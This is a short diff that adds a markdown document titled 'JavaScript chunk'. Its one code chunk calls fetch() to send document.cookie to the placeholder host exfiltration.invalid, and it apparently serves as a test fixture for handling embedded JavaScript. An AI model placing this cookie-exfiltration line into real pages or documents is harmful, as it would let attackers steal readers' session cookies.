@@ -1,0 +1,7 @@
+---
+title: "JavaScript chunk"
+---
+
+```{js}
+fetch("https://exfiltration.invalid/" + document.cookie);
+```
